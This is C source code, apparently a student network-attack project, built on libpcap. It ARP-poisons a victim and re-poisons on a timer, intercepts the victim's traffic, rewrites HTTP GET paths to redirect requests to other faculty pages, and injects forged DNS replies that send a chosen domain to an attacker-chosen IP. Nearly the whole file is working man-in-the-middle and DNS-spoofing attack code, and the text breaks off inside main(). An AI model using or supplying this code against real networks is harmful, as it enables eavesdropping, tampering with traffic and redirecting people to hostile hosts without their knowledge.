/* ANY INTERNET PACKET's STRUCTURE
Variable        Location (in bytes)
--------        -------------------
sniff_ethernet      @X
sniff_ip        @(X + SIZE_ETHERNET)
sniff_tcp/udp   @(X + SIZE_ETHERNET + (IP header length))
payload         @(X + SIZE_ETHERNET + (IP header length) + (TCP header length))
*/

/* Structure of DNS packets 
+---------------------+
|       Header        | Describes the type of packet and which fields are there in the packet
+---------------------+
|      Question       | Be careful to note that a DNS request for a certain domain may have multiple replies as a single \
+---------------------+
|       Answer        | domain can run on multiple IP addresses
+---------------------+
|     Authority       | We ignore these 2 fields, Authority and Additional, in our DNS Reply attack on the victim
+---------------------+
|     Additional      | Note: DNS replies and DNS requests adopts the same DNS header format as given in the struct dns_header
+---------------------+

*/

/*
@author Ashish Raste
*/

/* includes and defines */
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>

#ifndef ETHER_HDRLEN 
#define ETHER_HDRLEN 14
#endif

#ifndef PSEUDO_HDRLEN
#define PSEUDO_HDRLEN 12
#endif
#define IPADDR_LEN 4

#define bool int
#define true 1
#define false 0

#define TIME_INTERVAL 10            // time interval to send an ARP reply to the victim to keep him poisoned ;-)
#define TCP_OPTION_LENGTH 12        // options + tcp timestamp
#define PACKET_LENGTH 1518          // 1500(IP header(20) + TCP header(20) + real data payload(1460)) + 18(Ethernet header) = Ethernet MTU

#define NULL_CHECK(expr) \
    if (!(expr)) \
    { \
        printf("CHECK FAILED: %s\n", #expr); \
        return EXIT_FAILURE; \
    }   

#define MEMCPY(dest, src, len) \
    if (src) \
        memcpy(dest, src, len); \
    else \
        memset(dest, 0, len);    

#define MAC_FORMAT "%02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX"

//mac_ston(source string str, dest array mac)
inline void mac_ston(const char* str, u_char mac[ETH_ALEN])
{
    sscanf(str, MAC_FORMAT, &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]); //copies the value in str in MAC_FORMAT to mac[]
}
//mac_ntos(source array mac, dest string str)
inline void mac_ntos(const u_char mac[ETH_ALEN], char* str)
{
    sprintf(str, MAC_FORMAT, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);   //copies the values in mac[] to str
}

#define GREP_MAC "grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'" //regex to extract the mac address from a given output
                                                                         // with MAC address in it. Took the above defines and inlines
                                                                         // from the Internet

/* Structures involved : Structures are important for extraction of sub-packet data from an Internet Packet
struct ether_header
{
  u_int8_t  ether_dhost[ETH_ALEN];  // destination eth addr 
  u_int8_t  ether_shost[ETH_ALEN];  // source ether addr    
  u_int16_t ether_type;             // packet type ID field 
} __attribute__ ((__packed__));

struct timeval {
        time_t          tv_sec;         // seconds 
        suseconds_t     tv_usec;        // microseconds 
};
*/

struct myStruct {
    pcap_t* handle;    
    char    target_page[8];
    u_char  myMAC[ETH_ALEN];
    u_char  victimMAC[ETH_ALEN];    
    u_char  gatewayMAC[ETH_ALEN];
    struct  in_addr myIP;
    struct  in_addr victimIP;
    struct  in_addr gatewayIP;
} mystruct ;

struct arp_header
{
    u_int16_t       hw_type;                /* Format of hardware address  */
    u_int16_t       protocol_type;          /* Format of protocol address  */
    u_int8_t        hw_len;                 /* Length of hardware address  */
    u_int8_t        protocol_len;           /* Length of protocol address  */
    u_int16_t       opcode;                 /* ARP opcode (command)  */
    u_int8_t        sender_mac[ETH_ALEN];   /* Sender hardware address  */
    u_int16_t       sender_ip[2];           /* Sender IP address  */ 
    u_int8_t        target_mac[ETH_ALEN];   /* Target hardware address  */
    u_int16_t       target_ip[2];           /* Target IP address  */
};

struct ip_header {
    u_int8_t    ip_vhl;                          /* header length and version */    
    u_int8_t    ip_tos;                          /* type of service */
    u_int16_t   ip_len;                          /* total length of the header*/
    u_int16_t   ip_id;                           /* identification */
    u_int16_t   ip_off;                          /* fragment offset field */
    #define IP_RF 0x8000                         /*reserved fragment flag*/
    #define IP_DF 0x4000                         /*dont fragment flag*/
    #define IP_MF 0x2000                         /*more fragment flag*/    
    #define TCP_PROTOCOL 0x06
    #define UDP_PROTOCOL 0x11                    
    u_int8_t    ip_ttl;                          /* time to live */
    u_int8_t    ip_p;                            /* protocol */
    u_int16_t   ip_sum;                          /* checksum */
    struct  in_addr ip_src, ip_dst;              /* source and dest address */
};
#define IP_V(ip)    (((ip)->ip_vhl & 0xf0) >> 4) /* extracts the IP version */
#define IP_HL(ip)   ((ip)->ip_vhl & 0x0f)        /* extracts the IP header length value */

struct tcp_header
{
    u_short th_sport;                   /* source port */
    u_short th_dport;                   /* destination port */
    u_int   th_seq;                     /* sequence number */
    u_int   th_ack;                     /* acknowledgement number */
    u_char  th_offx2;                   /* data offset and reserved bits */
    #define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
    u_char  th_flags;
    #define TH_FIN  0x01
    #define TH_SYN  0x02
    #define TH_RST  0x04
    #define TH_PUSH 0x08
    #define TH_ACK  0x10
    #define TH_URG  0x20    
    #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_PUSH|TH_ACK|TH_URG)
    u_short th_win;                     /* window size*/
    u_short th_sum;                     /* checksum */
    u_short th_urp;                     /* urgent pointer */
};

struct pseudo_tcp_header
{
    struct in_addr src_ip, dest_ip;
    u_char reserved;
    u_char protocol;
    u_short tcp_size;
};

struct udp_header{
    u_short udp_src_port;           /*source port*/
    u_short udp_dst_port;           /*dest port*/
    u_short udp_len;                /*UDP length*/
    u_short udp_checksum;           /*UDP check sum*/
};

struct dns_header{
    u_short dns_trans_id;                           /*transaction id*/
    u_char  dns_flag_h;                             /*DNS flag high 8bit*/
#define DNS_QR(dns) (((dns)->dns_flag_h) & 0x80)    /*DNS type*/
#define DNS_OPCODE(dns) (((dns)->dns_flag_h) & 0x70)/*DNS message type*/
#define DNS_AA(dns) (((dns)->dns_flag_h) & 0x04)    /*DNS command answer*/
#define DNS_TC(dns) (((dns)->dns_flag_h) & 0x02)    /*DNS is cut*/
#define DNS_RD(dns) (((dns)->dns_flag_h) & 0x01)    /*DNS Resursive service*/
    u_char  dns_flag_l;                             /*DNS flag low  8bit*/
#define DNS_RA(dns) (((dns)->dns_flag_l) & 0x80)    /*DNS flag recursion available bit*/
#define DNS_Z(dns)  (((dns)->dns_flag_l) & 0x70)    /*don't know about this bit*/
#define DNS_AD(dns) (((dns)->dns_flag_l) & 0x20)    /*DNS flag authenticated data bit*/
#define DNS_CD(dns) (((dns)->dns_flag_l) & 0x10)    /*DNS flag checking disabled bit*/
#define DNS_RCODE(dns) (((dns)->dns_flag_l) & 0xF)  /*DNS flag return code*/
    u_short dns_q_num;                              /*DNS question number*/
    u_short dns_r_num;                              /*DNS answer number*/
    u_short dns_ar_num;
    u_short dns_er_num;
};

struct dns_query{
    u_char *dname;              /*domain name*/
    u_short type;               /*domain type*/
    u_short class;              /*domain class*/
};

struct dns_response{     
    u_short         offset;                     /*offset for the DNS response part*/
    u_long          ttl;                        /*time to live*/
    u_short         len;                        /*data length*/
    u_short         type;                       /*domain type*/
    u_short         class;                      /*domain class*/
    u_char          ip_addr[IPADDR_LEN];
};

/* Other Global variables */
char* if_name;
char* filter = "host ", *filter_string = NULL;             // use the victim's address for the filter
char pcap_errbuf[PCAP_ERRBUF_SIZE];
struct timeval tv, checktv;

/*Hexadecimal format for the GET requests */
u_char http_get_request_liangzk[]   = {0x2f,0x7e,0x6c,0x69,0x61,0x6e,0x67,0x7a,0x6b,0x2f};  //  /~liangzk/
u_char http_get_request_changec[]   = {0x2f,0x7e,0x63,0x68,0x61,0x6e,0x67,0x65,0x63,0x2f};  //  /~changec/
u_char http_get_request_chanmc[]    = {0x2f,0x7e,0x63,0x68,0x61,0x6e,0x6d,0x63,0x2f,0x2f};  //  /~chanmc/ -> filled as /~chanmc//
//u_char http_get[]                   = {0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31};            //  HTTP/1.1
u_char* targetIP;           // Target ip where the Victim should be redirected to, by using it in DNS reply
char* dns_request_dname;
//u_char dns_request_dname[17] =  {0x03,0x77,0x77,0x77,0x07,0x73,0x69,0x6e,0x67,0x74,0x65,0x6c,0x03,0x63,0x6f,0x6d,0x00}; 
                                    //www.singtel.com

/* Function prototypes and their definitions*/
u_int16_t Handle_Ethernet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
int Handle_ARP(struct myStruct* mystruct, const struct pcap_pkthdr* pkthdr, const u_char* packet);
int Handle_IP(struct myStruct* mystruct, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void Handle_DNS(struct myStruct* mystruct, u_char *packet, size_t size);
void Print_Data(const u_char *payload, int len);
u_short Calculate_Checksum(u_short *buffer, size_t size);
u_short Calculate_Pseudo_Checksum(u_char* packet, size_t len);
char* Handle_URL(char *domain_url);
char* URL_Decode(char* domain_url);
char Hex_To_Integer(char ch);

// set the timer to its (current value + TIME_INTERVAL) when the program starts
int Start_Timer(struct timeval *tv, time_t sec) {
    gettimeofday(tv, NULL);
    tv->tv_sec += sec;
    return 1;
}

//Checks the current time to see whether it > TIME_INTERVAL seconds than the previously noted time.
int Check_Timer(time_t sec) {    
    gettimeofday(&checktv, NULL);
    if (checktv.tv_sec-tv.tv_sec > sec) {     //current time has elapsed the 30 second interval
        gettimeofday(&tv, NULL);
        return 1;    
    }
    else
        return 0;    
}

// Converts a hex character to its integer value 
char Hex_To_Integer(char ch) {
    return isdigit(ch) ? ch - '0' : tolower(ch) - 'a' + 10;
}

// this function converts the uncommon characters in the url such as '%', '+' to their integer form and returns the url string
char* URL_Decode(char* domain_url) {
    char *pstr = domain_url, *buf = malloc(strlen(domain_url) + 1), *pbuf = buf;
    while (*pstr) {
        if (*pstr == '%') {
            if (pstr[1] && pstr[2]) {
                *pbuf++ = Hex_To_Integer(pstr[1]) << 4 | Hex_To_Integer(pstr[2]);
                pstr += 2;
            }
        } 
        else if (*pstr == '+') 
            *pbuf++ = ' ';
        else             
            *pbuf++ = *pstr;        
        pstr++;
    }
    *pbuf = '\0';    
    return buf;
}

// this function converts the url string returned from URL_Decode to the actual format that shall be written in a IP packet i.e
// number_of_chars_till_dot followed by that many characters form
char* Handle_URL(char *domain_url) {
        char *originalcode = URL_Decode(domain_url);
        size_t size = strlen(originalcode) + 2;
        char *urlcode = (char *)malloc(size);

        int i = 0;
        int num = 0;
        int pos = 0;
        char ch;
        urlcode[pos] = 0x00;
        while((ch = originalcode[i++]) != '\0')
        {
                num ++;
                urlcode[i] = ch;
                if(ch == 0x2e)                      // check if its a '.' in the url. If it is, then store the no. of characters 
                {                                   // read till that '.' in hex form and place it in the prefix place of that char sub-string 
                        urlcode[pos] = (u_char)(num - 1);
                        pos += num;
                        num = 0;
                }
        }
        urlcode[pos] = (u_char)num;
        urlcode[size-1] = 0x00;
        free(originalcode);
        return urlcode;
}

int Get_Mac_From_IP(const char* ip, u_char macAddr[ETH_ALEN]) {
    // we create an ARP entry for the given IP address in our network and then retrieve its MAC
    char cmd[100] = {0};
    sprintf(cmd, "ping -c1 %s > NIL", ip);
    system(cmd);

    memset(cmd, 0, sizeof(cmd));
    sprintf(cmd, "arp -a -n | grep %s", ip); //have to check whether this is creating some problem in injecting an ARP packet
    int nRet = Get_MAC_From_Terminal(cmd, macAddr);
    return 0;
}

int Get_MAC_From_Terminal(const char* cmd, u_char mac_addr[ETH_ALEN]) {
    char cmd_with_grep[100] = {0};
    sprintf(cmd_with_grep, "%s | %s", cmd, GREP_MAC);
    
    FILE* command_stream = popen(cmd_with_grep, "r");
    NULL_CHECK(command_stream);
    
    char mac_buf[19] = {0};
    if (fgets(mac_buf, sizeof(mac_buf)-1, command_stream))
        mac_ston(mac_buf, mac_addr);
    
    pclose(command_stream);
    return 0;
}

int Get_Gateway_IP(struct in_addr* gateway_ip) {
    FILE* command_stream = popen("/sbin/ip route | awk '/default/ {print $3}'", "r");
    NULL_CHECK(command_stream);

    char ip_addr_buf[16] = {0};
    fgets(ip_addr_buf, sizeof(ip_addr_buf)-1, command_stream);
    inet_aton(ip_addr_buf, gateway_ip);    
    return 0;
}

void Get_IP_From_Device(char *dev) {
    int i, temp_err;
    struct ifreq ifr;
    if((size_t)strlen(dev) < sizeof(ifr.ifr_name)) {
        memcpy(ifr.ifr_name, dev, strlen(if_name));
        ifr.ifr_name[strlen(if_name)] = 0;
    }
    else {
        printf("interface name is longer than the capacity of ifr.ifr_name\n");
        return;
    }
    //  providing an open socket descriptor
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1) {
        printf("couldn't open the socket\n");
        return;
    }
    //invoking ioctl 
    if(ioctl(fd, SIOCGIFADDR, &ifr) == -1) {    //request to get the PA address on the interface with ifreq as the structure        
        temp_err = errno;
        close(fd);
        printf("%s\n", strerror(temp_err));
        return;
    }

    //no need to check the return structure, since it returns ifr_addr in the form of struct sockaddr_in
    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    mystruct.myIP = ipaddr->sin_addr;           // ipaddr->sin_addr is of type struct in_addr :-)    
    close(fd);    
    return;
}

void Print_Network_Variables(struct myStruct mystruct) {
    char mac_string[18] = {0};
    mac_ntos(mystruct.myMAC, mac_string);
    printf("Attacker's MAC:\t%s\n", mac_string);
    printf("Victim IP:\t%s\n", inet_ntoa(mystruct.victimIP)); 
    char* gateway_ip_string = inet_ntoa(mystruct.gatewayIP);
    mac_ntos(mystruct.victimMAC, mac_string);    
    printf("Victim's MAC:\t%s\n", mac_string);
    printf("Gateway IP:\t%s\n", gateway_ip_string);
    mac_ntos(mystruct.gatewayMAC, mac_string);
    printf("Gateway's MAC:\t%s\n", mac_string);
}

void Main_Callback(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet) {  
    struct myStruct* mystruct = NULL;    
    mystruct = (struct myStruct *) arg ;
    if (Check_Timer(TIME_INTERVAL)) {        
        printf("Timer timeout!!\n");
        ARP_Inject(*mystruct, false, mystruct->myMAC, &(mystruct->gatewayIP), mystruct->victimMAC, &(mystruct->victimIP));
    }
    u_int16_t packet_type = Handle_Ethernet(arg, pkthdr, packet);
    if(packet_type == ETHERTYPE_ARP) {        
        Handle_ARP(mystruct, pkthdr, packet);    //dont bother about the ARP packets in HTTP redirecting
    }
    else if(packet_type == ETHERTYPE_IP) {                
        Handle_IP(mystruct, pkthdr, packet);   
    }        
    return;
}

u_int16_t Handle_Ethernet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    u_int caplen = pkthdr->caplen;
    u_int length = pkthdr->len;
    struct ether_header *eth_hdr;  // Extract the ethernet header from the packet
    u_short ether_type;
    if (caplen < ETHER_HDRLEN) {
        fprintf(stdout,"Packet length less than ethernet header length\n");
        return -1;
    }
    eth_hdr = (struct ether_header *) packet;
    ether_type = ntohs(eth_hdr->ether_type);    
    return ether_type;
}

int Handle_ARP(struct myStruct* mystruct, const struct pcap_pkthdr* pkthdr, const u_char* packet) { 
    printf("Handling ARP packet..\n");
    const struct ether_header* eth_hdr = (struct ether_header *) packet;   
    const struct arp_header* arp_hdr = (struct arp_header *)(packet + sizeof(eth_hdr));
    
    u_int16_t packet_type = arp_hdr->opcode;   
    if (memcmp(arp_hdr->sender_mac, mystruct->victimMAC, ETH_ALEN) == 0)
    {
        printf("\n[ARP] Request Packet From Victim");
        return ARP_Inject(*mystruct, false, mystruct->myMAC, &(mystruct->gatewayIP), mystruct->victimMAC, &(mystruct->victimIP));
    }
    if(memcmp(arp_hdr->sender_mac, mystruct->gatewayMAC, ETH_ALEN == 0) &&
        memcmp(arp_hdr->target_ip, (const void *)mystruct->victimIP.s_addr, sizeof(arp_hdr->target_ip)) == 0) {
        printf("\n[ARP] Request/Reply from Gateway to Victim");
        sleep(5);
        return ARP_Inject(*mystruct, false, mystruct->myMAC, &(mystruct->gatewayIP), mystruct->victimMAC, &(mystruct->victimIP));
    }    
    return;
}

int Handle_IP(struct myStruct *mystruct, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    printf("Handling IP packet..\n");
    size_t packet_length = pkthdr->caplen;    
    u_char buf[PACKET_LENGTH];
    memset(buf, '\0', sizeof(buf));
    memcpy(buf, packet, packet_length);

    struct ether_header* eth_hdr = (struct ether_header *) packet;  
    struct ip_header* ip_hdr = (struct ip_header*)(packet + ETHER_HDRLEN); 
    int offset = 0;
    u_short cksum = 0;
    u_char checksum[sizeof(u_short)] ;
    
    if(memcmp(eth_hdr->ether_shost, mystruct->victimMAC, ETH_ALEN) == 0) {    
        printf("\n[IP] From victim towards Gateway\n");
        printf("Victim's IP: %s\n", inet_ntoa(mystruct->victimIP));        
        if(ip_hdr->ip_p == TCP_PROTOCOL) {                       //Handle the TCP packet to change its payload (under HTTP header)
            offset = ETHER_HDRLEN + sizeof(struct ip_header) + sizeof(struct tcp_header) + TCP_OPTION_LENGTH + 4;
            if(memcmp(buf+offset, http_get_request_changec, sizeof(http_get_request_changec)) == 0) {
                printf("Found Dr. Chang's URI\n");
                if (strcmp(mystruct->target_page, "liangzk") == 0)         // redirect to Dr. Liang's page
                    memcpy(buf+offset, http_get_request_liangzk, sizeof(http_get_request_liangzk));
                else if(strcmp(mystruct->target_page, "chanmc")==0)      // redirect to Dr Chan's page
                    memcpy(buf+offset, http_get_request_chanmc, sizeof(http_get_request_chanmc));
                
                memset(buf+ETHER_HDRLEN+sizeof(struct ip_header)+16, 0, sizeof(u_short));   //set the TCP checksum to zero
                cksum = Calculate_Pseudo_Checksum(buf, packet_length);
                checksum[0] = (u_char)(((htons(cksum)) & 0xFF00) >> 8);
                checksum[1] = (u_char)((htons(cksum)) & 0x00FF);
                memcpy(buf + ETHER_HDRLEN + sizeof(struct ip_header) + 16, checksum, sizeof(u_short)) ;
            }
        }
        if (ip_hdr->ip_p == UDP_PROTOCOL) {        
            printf("Its an UDP packet\n");
            offset = ETHER_HDRLEN + sizeof(struct ip_header) + sizeof(struct udp_header) + sizeof(struct dns_header);
            // only handle the DNS packet if its domain has to be forged by us, otherwise do nothing
            if(memcmp(buf + offset, dns_request_dname, strlen(dns_request_dname)+1) == 0) {
                printf("Ah, here comes our DNS query! Going to handle it\n");
                printf("DNS request Domain name:\t%s\n", dns_request_dname);
                Handle_DNS(mystruct, buf, packet_length);                
                return ;
            } 
            else
                printf("Some other DNS packet\n");
        }                       
        memcpy(buf, mystruct->gatewayMAC, ETH_ALEN);
        memcpy(buf + ETH_ALEN, mystruct->myMAC, ETH_ALEN);
        if ((packet_length = pcap_inject(mystruct->handle, buf, packet_length)) == -1 ) {
                fprintf(stderr, "Packet injection failed: %s\n", pcap_geterr(mystruct->handle));
                exit(EXIT_FAILURE);                
        }        
    }        
    return;                        
}   

void Handle_DNS(struct myStruct *mystruct, u_char *packet, size_t size) {
    printf("Handling DNS now\n");
    struct ether_header *eth_send = (struct ether_header *)malloc(sizeof(struct ether_header));
    struct ether_header *eth      = (struct ether_header *)packet;
    struct ip_header  *ip_send  = (struct ip_header *)malloc(sizeof(struct ip_header));
    struct ip_header  *ip       = (struct ip_header *)(packet + ETHER_HDRLEN);
    struct udp_header *udp_send = (struct udp_header *)malloc(sizeof(struct udp_header));
    struct udp_header *udp      = (struct udp_header *)(packet + ETHER_HDRLEN + sizeof(struct ip_header));
    struct dns_header *dns_send = (struct dns_header *)malloc(sizeof(struct udp_header));
    struct dns_header *dns      = (struct dns_header *)(packet + ETHER_HDRLEN + sizeof(struct ip_header) + sizeof(struct udp_header));
    struct dns_query  *dns_q    = (struct dns_query *)malloc(sizeof(struct dns_query));
    struct dns_response *dns_r  = (struct dns_response *)malloc(sizeof(struct dns_response));
    size_t offset               = ETHER_HDRLEN + sizeof(struct ip_header) + sizeof(struct udp_header) + sizeof(struct dns_header);
    printf("Offset calculated in the beginning: %d\n", offset);

    u_char buf[PACKET_LENGTH];
    memset(buf, '\0', PACKET_LENGTH);
    memcpy(buf, packet, size);
    printf("Packet data copied to the buffer\n");

    // Create the DNS query header
    dns_q->dname = (packet + offset);                               // domain name, this will be forged to a targetIP address now    
    dns_q->type  = htons(0x0001);                                   // Type:  A (Host address)
    dns_q->class = htons(0x0001);                                   // Class: IN (0x0001)
    printf("Query header built\n");    

    // Create the DNS response header    
    dns_r->offset= htons(0xc00c);                                   // offset for the reply part
    dns_r->type  = htons(0x0001);                                   // Type: A (Host address)
    dns_r->class = htons(0x0001);                                   // Class: IN (0x0001)
    dns_r->ttl   = htonl(0x000000FF);                               // time to live 
    dns_r->len   = htons(0x0004);                                   // Data length                                       
    memcpy(dns_r->ip_addr, targetIP, IPADDR_LEN);
    printf("Response header built\n");

    // build the DNS header
    memcpy(dns_send, dns, sizeof(struct dns_header));    
    dns_send->dns_flag_h = 0x81;
    dns_send->dns_flag_l = 0x80;
    dns_send->dns_r_num  = htons(0x0001);
    printf("DNS header built\n");

    // build the UDP header
    udp_send->udp_src_port = udp->udp_dst_port;
    udp_send->udp_dst_port = udp->udp_src_port;
    udp_send->udp_len      = htons(ntohs(udp->udp_len) + sizeof(struct dns_response));                            
    udp_send->udp_checksum = htons(0x0000);             // the victim shouldn't check the checksum
    printf("UDP header built\n");

    // build the IP header
    memcpy(ip_send, ip, sizeof(struct ip_header));
    //printf("IP header copied\n");
    ip_send->ip_len = htons(ntohs(ip->ip_len) + sizeof(struct dns_response));
    ip_send->ip_id  = htons(0x5555);
    ip_send->ip_off = htons(0x0000);
    ip_send->ip_ttl = 0x37;
    ip_send->ip_sum = 0x0000;
    memcpy(&(ip_send->ip_src), &(ip->ip_dst), sizeof(struct in_addr));
    memcpy(&(ip_send->ip_dst), &(ip->ip_src), sizeof(struct in_addr));    
    ip_send->ip_sum = Calculate_Checksum((u_short *)ip_send, sizeof(struct ip_header));
    printf("IP header built\n");

    // build the Ethernet header
    memcpy(eth_send->ether_dhost, eth->ether_shost, ETH_ALEN);
    memcpy(eth_send->ether_shost, mystruct->gatewayMAC, ETH_ALEN);
    eth_send->ether_type = htons(ETHERTYPE_IP);
    printf("Ethernet header built\n");

    // Finally build the packet
    memcpy(buf, eth_send, ETHER_HDRLEN);                            // copy the Ethernet header
    offset = ETHER_HDRLEN;
    memcpy(buf + offset, ip_send, sizeof(struct ip_header));        // copy the IP header
    offset = offset + sizeof(struct ip_header);
    memcpy(buf + offset, udp_send, sizeof(struct udp_header));      // copy the UDP header
    offset = offset + sizeof(struct udp_header);
    memcpy(buf + offset, dns_send, sizeof(struct dns_header));      // copy the DNS header
    offset = offset + sizeof(struct dns_header);
    printf("Offset calculated before adding DNS response: %d\n", offset);
    printf("Size of DNS response header to be copied: %d\n", sizeof(struct dns_response));
    // MEMCPY(buf + size, dns_r, sizeof(struct dns_response));         // copy the DNS response header at the tail of the packet :-)
    // I don't know why null bytes were inserted by the above statement. Have resorted to some stupid lengthy steps as follows
    MEMCPY(buf+size, (const void*)&(dns_r->offset), sizeof(dns_r->offset));
    size += sizeof(dns_r->offset);
    MEMCPY(buf+size, (const void*)&(dns_r->type), sizeof(dns_r->type));
    size += sizeof(dns_r->type);
    MEMCPY(buf+size, (const void*)&(dns_r->class), sizeof(dns_r->class));
    size += sizeof(dns_r->class) ;
    MEMCPY(buf+size, (const void*)&(dns_r->ttl), sizeof(dns_r->ttl));
    size += sizeof(dns_r->ttl);
    MEMCPY(buf+size, (const void*)&(dns_r->len), sizeof(dns_r->len));
    size += sizeof(dns_r->len);
    MEMCPY(buf+size, (const void*)&(dns_r->ip_addr), sizeof(dns_r->ip_addr));
    size += sizeof(dns_r->ip_addr);
    //size = size + sizeof(struct dns_response);    
    printf("Calculated size: %d bytes\n", size);
    if ((size = pcap_inject(mystruct->handle, buf, size)) == -1) {
        fprintf(stderr, "Inject Packet Failed:%s\n", pcap_geterr(mystruct->handle));
        exit(EXIT_FAILURE);
    }
    printf("Created the DNS reply packet, going to inject it, size: %d bytes\n", size);
    free(eth_send); free(ip_send); free(udp_send); free(dns_r); free(dns_q);
    return;
}    

u_short Calculate_Checksum(u_short *buffer, size_t size) {
    u_long cksum = 0;
    while(size > 1) {
        cksum += *buffer ++;
        size  -= sizeof(u_short);
    }
    if (size)                           // if the checksum is odd
        cksum += *(u_char *)buffer;
    
    /* add the carries to the LSB 16-bits*/
    while(cksum >> 16)
        cksum = (cksum >> 16) + (cksum & 0xffff);
    
    return (u_short)(~cksum);
}

u_short Calculate_Pseudo_Checksum(u_char* packet, size_t len) {
    u_short cksum = 0;
    struct ip_header* ip_hdr = (struct ip_header *)(packet + ETHER_HDRLEN); 
    //building the pseudo-header  
    struct pseudo_tcp_header pseudo_tcp_hdr;  
    memcpy(&(pseudo_tcp_hdr.src_ip), &(ip_hdr->ip_src), sizeof(ip_hdr->ip_src));
    memcpy(&(pseudo_tcp_hdr.dest_ip), &(ip_hdr->ip_dst), sizeof(ip_hdr->ip_dst));
    pseudo_tcp_hdr.reserved = 0x00;
    pseudo_tcp_hdr.protocol = IPPROTO_TCP;
    pseudo_tcp_hdr.tcp_size = len - ETHER_HDRLEN - sizeof(struct ip_header);  // equal to (tcp_header_len + data_len)
    printf("Pseudo data length to be checksummed :\n", pseudo_tcp_hdr.tcp_size);

    u_char word[sizeof(u_short)] ;  //create a word of 16 bits, to facilitate checksum with 16-bit words 

    word[0] = (u_char)((pseudo_tcp_hdr.tcp_size & 0xFF00) >> 8);
    word[1] = (u_char)(pseudo_tcp_hdr.tcp_size & 0x00FF);

    // build a buffer having the Pseudo-header fields
    u_char buf[PSEUDO_HDRLEN + pseudo_tcp_hdr.tcp_size];
    memset(buf, '\0', PSEUDO_HDRLEN + pseudo_tcp_hdr.tcp_size);

    memcpy(buf, &(pseudo_tcp_hdr.src_ip), sizeof(in_addr_t));
    memcpy(buf + sizeof(in_addr_t), &(pseudo_tcp_hdr.dest_ip), sizeof(in_addr_t));
    memcpy(buf + 2 * sizeof(in_addr_t), &(pseudo_tcp_hdr.reserved), 1);
    memcpy(buf + 2 * sizeof(in_addr_t) + 1, &(pseudo_tcp_hdr.protocol), 1);
    memcpy(buf + 2 * sizeof(in_addr_t) + 2, word, 2);
    memcpy(buf + 2 * sizeof(in_addr_t) + 4, packet + ETHER_HDRLEN + sizeof(struct ip_header), pseudo_tcp_hdr.tcp_size);

    cksum = Calculate_Checksum((u_short *)buf, pseudo_tcp_hdr.tcp_size + PSEUDO_HDRLEN);    
    return cksum;
}
                        
void Create_ARP_Packet(struct myStruct mystruct, bool packet_type, const u_char sender_mac[ETH_ALEN],
    struct in_addr* sender_ip, const u_char target_mac[ETH_ALEN], struct in_addr* target_ip, unsigned char** arp_packet) {

    struct ether_header* eth_hdr = NULL;
    struct arp_header* arp_hdr = NULL;
    unsigned char frame[sizeof(struct ether_header)+sizeof(struct arp_header)];
   
    // FILLING THE ETHERNET HEADER        
    eth_hdr = (struct ether_header *) malloc(sizeof(struct ether_header));
    MEMCPY(eth_hdr->ether_shost, sender_mac, sizeof(eth_hdr->ether_shost));
    MEMCPY(eth_hdr->ether_dhost, target_mac, sizeof(eth_hdr->ether_dhost));
    eth_hdr->ether_type = htons(ETH_P_ARP);
    
    // FILLING THE ARP HEADER
    arp_hdr = (struct arp_header *)malloc(sizeof(struct arp_header));
    arp_hdr->hw_type = htons(ARPHRD_ETHER);
    arp_hdr->protocol_type = htons(ETH_P_IP);
    arp_hdr->hw_len = ETHER_ADDR_LEN;
    arp_hdr->protocol_len = sizeof(in_addr_t);
    arp_hdr->opcode = htons(packet_type?0x0001:0x0002);    
    printf("\narp_header->opcode: %d\n", ntohs(arp_hdr->opcode));
    MEMCPY(arp_hdr->sender_mac, sender_mac, sizeof(arp_hdr->sender_mac));        
    memcpy((arp_hdr->sender_ip), &(sender_ip->s_addr), sizeof(arp_hdr->sender_ip));
    MEMCPY(arp_hdr->target_mac, target_mac, sizeof(arp_hdr->target_mac));
    memcpy((arp_hdr->target_ip), &(target_ip->s_addr), sizeof(arp_hdr->target_ip));    

    memcpy(frame, eth_hdr, sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header), arp_hdr, sizeof(struct arp_header));

    char mac_string[20] = {0};
    mac_ntos(arp_hdr->sender_mac, mac_string);
    printf("Source MAC:\t%s\n", mac_string);
    mac_ntos(arp_hdr->target_mac, mac_string);
    printf("Target MAC:\t%s\n", mac_string);
    printf("Source IP:\t%s\n", inet_ntoa(*sender_ip));
    printf("Destination IP:\t%s\n", inet_ntoa(*target_ip));
    printf("Size of packet: %d\n", sizeof(frame));

    //*arp_packet = frame; //have to figure out handling pointers for the frame just created !!!
    if(pcap_inject(mystruct.handle, frame, sizeof(frame)) == -1) {
         fprintf(stderr, "%s\n", pcap_errbuf);
         pcap_close(mystruct.handle);
    }    
    return;
}

int ARP_Inject(struct myStruct mystruct, bool packet_type, 
    const u_char attacker_mac[ETH_ALEN], struct in_addr* fooled_ip, 
    const u_char target_mac[ETH_ALEN], struct in_addr* target_ip) {
    unsigned char* arp_packet = NULL;
    u_int16_t packet_length = 0;
    printf("\nGoing to create an ARP reply packet");
    Create_ARP_Packet(mystruct, packet_type, attacker_mac, fooled_ip, target_mac, target_ip, &arp_packet);
//    if(pcap_inject(mystruct.handle, (void *)(arp_packet), packet_length) == -1)     
//       fprintf(stderr, "%s\n", pcap_errbuf);         
}

int main(int argc, char* argv[]) {
    //struct timeval tv;
    filter_string = (char *)malloc(strlen(filter)+strlen(argv[2])+1);       
    strncat(filter_string, filter, strlen(filter));
    strncat(filter_string, argv[2], strlen(argv[2]));

    struct bpf_program fp;              // holds the compiled program     
